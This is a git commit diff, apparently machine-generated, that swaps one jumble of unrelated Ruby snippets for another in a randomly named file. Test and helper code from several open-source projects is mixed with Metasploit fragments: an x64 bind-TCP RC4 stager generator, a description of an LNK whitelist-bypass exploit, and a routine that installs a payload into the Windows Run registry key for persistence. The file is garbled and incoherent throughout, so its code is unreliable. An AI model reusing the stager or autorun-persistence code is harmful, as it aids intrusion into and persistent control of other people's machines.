8acd06cc73987452f40799d72a3633a9d672cf25
SUNsung <weatherius@gmail.com>
2019-09-20 06:22:35 +0300

    Rewrite [51XE1w6QQIVIs51wNOVn3Ah69k51VT4Z5QE4hUQ513I2.rb] File in: 2019-09-20 06:22:34

--- ruby/51XE1w6QQIVIs51wNOVn3Ah69k51VT4Z5QE4hUQ513I2.rb
+++ ruby/51XE1w6QQIVIs51wNOVn3Ah69k51VT4Z5QE4hUQ513I2.rb
@@ -1,174 +1,146 @@
 
         
-            it 'does not permit path traversal requests' do
-      expect { finder.find('../foo') }.to raise_error(/Invalid path/)
+          def relayable?
+    @status.public_visibility?
+  end
+    
+      private
+    
+      describe 'PUT #update' do
+    it 'updates notifications settings' do
+      user.settings['notification_emails'] = user.settings['notification_emails'].merge('follow' => false)
+      user.settings['interactions'] = user.settings['interactions'].merge('must_be_follower' => true)
+    
+        if verifier.valid?
+      @proof.verified = true
+      @proof.live     = false
+    else
+      @proof.errors.add(:base, I18n.t('identity_proofs.errors.keybase.verification_failed', kb_username: @proof.provider_username))
     end
   end
     
-        # Ensure the file is removed
-    project.bfg_object_map.remove!
-    notification_service.repository_cleanup_failure(project, user, error)
+      #
+  # Generate and compile the stager
+  #
+  def generate_bind_tcp_rc4(opts={})
+    combined_asm = %Q^
+      cld                     ; Clear the direction flag.
+      and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
+      call start              ; Call start, this pushes the address of 'api_call' onto the stack.
+      #{asm_block_api}
+      start:
+        pop rbp               ; block API pointer
+      #{asm_bind_tcp(opts)}
+      #{asm_block_recv_rc4(opts)}
+    ^
+    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
   end
     
-          def filter_options(**options)
-        @filter_options.merge!(options)
-      end
+      include Msf::Payload::Stager
+  include Msf::Payload::Windows::BindTcpRc4_x64
     
-    puts 'Configuring Bundler for #{rails_env} environment and #{database} database.'
+    setTimeout(go_, 300);
     
-          rescue_from Api::OpenidConnect::Error::InvalidRedirectUri do |e|
-        validation_fail_redirect_uri(e)
-      end
+              This vulnerability is a variant of MS15-020 (CVE-2015-0096). The created LNK file is
+          similar except an additional SpecialFolderDataBlock is included. The folder ID set
+          in this SpecialFolderDataBlock is set to the Control Panel. This is enough to bypass
+          the CPL whitelist. This bypass can be used to trick Windows into loading an arbitrary
+          DLL file.
     
-      def create
-    # Contacts autocomplete does not work the same way on mobile and desktop
-    # Mobile returns contact ids array while desktop returns person id
-    # This will have to be removed when mobile autocomplete is ported to Typeahead
-    recipients_param, column = [%i(contact_ids id), %i(person_ids person_id)].find {|param, _| params[param].present? }
-    if recipients_param
-      person_ids = current_user.contacts.mutual.where(column => params[recipients_param].split(',')).pluck(:person_id)
+      # Function to install payload in to the registry HKLM or HKCU
+  #-------------------------------------------------------------------------------
+  def write_to_reg(key, script_on_target)
+    nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8) + 8)
+    print_status('Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}')
+    if key
+      registry_setvaldata('#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', nam, script_on_target, 'REG_SZ')
+      print_good('Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}')
+      @clean_up_rc << 'reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v '#{nam}'\n'
+    else
+      print_error('Error: failed to open the registry key for writing')
     end
+  end
     
-      respond_to :html, :mobile
-  respond_to :json, :only => :show
-    
-          def right_diff_line_number(id, line)
-        if line =~ /^@@/
-          m, ri                   = *line.match(/\+(\d+)/)
-          @right_diff_line_number = ri.to_i
-          @current_line_number    = @right_diff_line_number
-          ret                     = '...'
-        elsif line[0] == ?-
-          ret = ' '
-        elsif line[0] == ?+
-          ret                     = @right_diff_line_number.to_s
-          @right_diff_line_number += 1
-          @current_line_number    = @right_diff_line_number - 1
-        else
-          ret                     = @right_diff_line_number.to_s
-          @right_diff_line_number += 1
-          @current_line_number    = @right_diff_line_number - 1
+          def remove_bad_cookies(request, response)
+        return if bad_cookies.empty?
+        paths = cookie_paths(request.path)
+        bad_cookies.each do |name|
+          paths.each { |path| response.set_cookie name, empty_cookie(request.host, path) }
         end
-        ret
       end
+    
+          def escape_hash(hash)
+        hash = hash.dup
+        hash.each { |k,v| hash[k] = escape(v) }
+        hash
+      end
+    
+          def react_and_close(env, body)
+        reaction = react(env)
+    
+          expected_header = <<-END.chomp
+rack.%2573ession=; domain=example.org; path=/; expires=Thu, 01 Jan 1970 00:00:00 -0000
+rack.%2573ession=; domain=example.org; path=/some; expires=Thu, 01 Jan 1970 00:00:00 -0000
+rack.%2573ession=; domain=example.org; path=/some/path; expires=Thu, 01 Jan 1970 00:00:00 -0000
+rack.session=; domain=example.org; path=/; expires=Thu, 01 Jan 1970 00:00:00 -0000
+rack.session=; domain=example.org; path=/some; expires=Thu, 01 Jan 1970 00:00:00 -0000
+rack.session=; domain=example.org; path=/some/path; expires=Thu, 01 Jan 1970 00:00:00 -0000
+END
+      expect(last_response.headers['Set-Cookie']).to eq(expected_header)
     end
   end
+    
+          def editable
+        @editable
+      end
+    
+    # Silence locale validation warning
+require 'i18n'
+I18n.enforce_available_locales = false
+    
+      test 'clean path without leading slash' do
+    assert_equal '/Mordor', clean_path('Mordor')
+  end
+    
+      test 'remove page extentions' do
+    view = Precious::Views::LatestChanges.new
+    assert_equal 'page', view.remove_page_extentions('page.wiki')
+    assert_equal 'page-wiki', view.remove_page_extentions('page-wiki.md')
+    assert_equal 'file.any_extention', view.remove_page_extentions('file.any_extention')
+  end
+    
+        @view = Precious::Views::Page.new
+    @view.instance_variable_set :@page, page
+    @view.instance_variable_set :@content, page.formatted_data
+    @view.instance_variable_set :@h1_title, true
+    
+        assert_nil dead_set.find_job('000101')
+    assert dead_set.find_job('000102')
+    assert dead_set.find_job('000103')
+  end
 end
 
     
-          def page_name
-        @name.gsub('-', ' ')
-      end
+    class Component
+  include Sidekiq::ExceptionHandler
     
-          attr_reader :page, :page_num, :allow_editing
-    
-      test 'displays_latest_changes' do
-    get('/latest_changes')
-    body = last_response.body
-    
-    context 'Precious::Views::Page' do
-  setup do
-    examples = testpath 'examples'
-    @path    = File.join(examples, 'test.git')
-    FileUtils.cp_r File.join(examples, 'empty.git'), @path, :remove_destination => true
-    @wiki = Gollum::Wiki.new(@path)
+      it 'uses and stringifies specified options' do
+    assert_equal [], Sidekiq::Queue.all.map(&:name)
+    q = Sidekiq::Queue.new('notdefault')
+    assert_equal 0, q.size
+    MyModel.delay(queue: :notdefault).long_class_method
+    assert_equal ['notdefault'], Sidekiq::Queue.all.map(&:name)
+    assert_equal 1, q.size
   end
     
-    desc 'Update version number and gemspec'
-task :bump do
-  puts 'Updated version to #{bump_version}'
-  # Execute does not invoke dependencies.
-  # Manually invoke gemspec then validate.
-  Rake::Task[:gemspec].execute
-  Rake::Task[:validate].execute
-end
+        it 'saves and restores locale' do
+      I18n.locale = 'fr'
+      msg = {}
+      mw = Sidekiq::Middleware::I18n::Client.new
+      mw.call(nil, msg, nil, nil) { }
+      assert_equal :fr, msg['locale']
     
-          begin
-        wiki.write_page(name, format, params[:content], commit_message, path)
-    
-          def regexp_to_xpath_conditions(regexp)
-        condition = XPath.current
-        condition = condition.uppercase if regexp.casefold?
-        Selector::RegexpDisassembler.new(regexp).alternated_substrings.map do |strs|
-          strs.map { |str| condition.contains(str) }.reduce(:&)
-        end.reduce(:|)
-      end
+          assert Sidekiq::Testing.fake?
+      assert Sidekiq::Testing.enabled?
     end
   end
-end
-
-    
-      it 'should assert no matching ancestor' do
-    el = @session.find(:css, '#ancestor1')
-    expect(el).to have_no_ancestor(:css, '#child')
-    expect(el).to have_no_ancestor(:css, '#ancestor1_sibiling')
-    expect(el).not_to have_ancestor(:css, '#child')
-    expect(el).not_to have_ancestor(:css, '#ancestor1_sibiling')
-  end
-end
-
-    
-    module Capybara
-  module Node
-    module Finders
-      ##
-      #
-      # Find an {Capybara::Node::Element} based on the given arguments. {#find} will raise an error if the element
-      # is not found.
-      #
-      #     page.find('#foo').find('.bar')
-      #     page.find(:xpath, './/div[contains(., 'bar')]')
-      #     page.find('li', text: 'Quox').click_link('Delete')
-      #
-      # @param (see #all)
-      #
-      # @macro waiting_behavior
-      #
-      # @!macro system_filters
-      #   @option options [String, Regexp] text      Only find elements which contain this text or match this regexp
-      #   @option options [String, Boolean] exact_text
-      #     When String the elements contained text must match exactly, when Boolean controls whether the `text` option must match exactly.
-      #     Defaults to {Capybara.configure exact_text}.
-      #   @option options [Boolean] normalize_ws
-      #     Whether the `text`/`exact_text` options are compared against elment text with whitespace normalized or as returned by the driver.
-      #     Defaults to {Capybara.configure default_normalize_ws}.
-      #   @option options [Boolean, Symbol] visible  Only find elements with the specified visibility:
-      #                                              * true - only finds visible elements.
-      #                                              * false - finds invisible _and_ visible elements.
-      #                                              * :all - same as false; finds visible and invisible elements.
-      #                                              * :hidden - only finds invisible elements.
-      #                                              * :visible - same as true; only finds visible elements.
-      #   @option options [Boolean] obscured  Only find elements with the specified obscured state:
-      #                                       * true - only find elements whose centerpoint is not in the viewport or is obscured by another non-descendant element.
-      #                                       * false - only find elements whose centerpoint is in the viewport and is not obscured by other non-descendant elements.
-      #   @option options [String, Regexp]  id           Only find elements with an id that matches the value passed
-      #   @option options [String, Array<String>, Regexp] class  Only find elements with matching class/classes.
-      #                                            * Absence of a class can be checked by prefixing the class name with `!`
-      #                                            * If you need to check for existence of a class name that starts with `!` then prefix with `!!`
-      #
-      #                                                class:['a', '!b', '!!!c'] # limit to elements with class 'a' and '!c' but not class 'b'
-      #
-      #   @option options [String, Regexp, Hash] style  Only find elements with matching style. String and Regexp will be checked against text of the elements `style` attribute, while a Hash will be compared against the elements full style
-      #   @option options [Boolean] exact            Control whether `is` expressions in the given XPath match exactly or partially. Defaults to {Capybara.configure exact}.
-      #   @option options [Symbol] match        The matching strategy to use. Defaults to {Capybara.configure match}.
-      #
-      # @return [Capybara::Node::Element]      The found element
-      # @raise  [Capybara::ElementNotFound]    If the element can't be found before time expires
-      #
-      def find(*args, **options, &optional_filter_block)
-        options[:session_options] = session_options
-        synced_resolve Capybara::Queries::SelectorQuery.new(*args, options, &optional_filter_block)
-      end
-    
-          def initialize(app)
-        @app = app
-        @disable_markup = format(DISABLE_MARKUP_TEMPLATE, selector: self.class.selector_for(Capybara.disable_animation))
-      end
-    
-    module Capybara
-  class SessionConfig
-    OPTIONS = %i[always_include_port run_server default_selector default_max_wait_time ignore_hidden_elements
-                 automatic_reload match exact exact_text raise_server_errors visible_text_only
-                 automatic_label_click enable_aria_label save_path asset_host default_host app_host
-                 server_host server_port server_errors default_set_options disable_animation test_id
-                 predicates_wait default_normalize_ws w3c_click_offset].freeze
